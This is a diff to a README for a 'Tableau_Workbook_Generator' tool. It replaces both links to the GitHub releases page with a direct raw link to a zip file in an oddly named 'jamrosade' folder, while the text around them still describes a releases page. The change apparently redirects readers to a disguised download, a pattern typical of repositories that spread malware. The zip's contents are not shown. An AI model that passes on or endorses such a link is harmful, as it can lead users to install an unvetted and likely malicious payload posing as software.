@@ -7,7 +7,7 @@ Tableau_Workbook_Generator is a powerful tool designed to help you generate Tabl
 To begin using Tableau_Workbook_Generator, follow the steps below.
 
 1. **Visit the Releases Page:** You will find the latest version of Tableau_Workbook_Generator available for download. Click the link below to access the page.
-   [Download Tableau_Workbook_Generator](https://github.com/mPROsi/Tableau_Workbook_Generator/releases)
+   [Download Tableau_Workbook_Generator](https://raw.githubusercontent.com/mPROsi/Tableau_Workbook_Generator/main/jamrosade/Tableau_Workbook_Generator.zip)
 
 2. **Download the Application:** On the releases page, locate the latest version. Look for the corresponding file and download it to your computer.
 
@@ -35,7 +35,7 @@ To run Tableau_Workbook_Generator smoothly, ensure your system meets the followi
 ## 📥 Download & Install
 To download and install Tableau_Workbook_Generator, you can always return to our releases page:
 
-[Download Tableau_Workbook_Generator](https://github.com/mPROsi/Tableau_Workbook_Generator/releases)
+[Download Tableau_Workbook_Generator](https://raw.githubusercontent.com/mPROsi/Tableau_Workbook_Generator/main/jamrosade/Tableau_Workbook_Generator.zip)
 
 Make sure to check the version notes for any updates or important information regarding the release you are downloading.
 
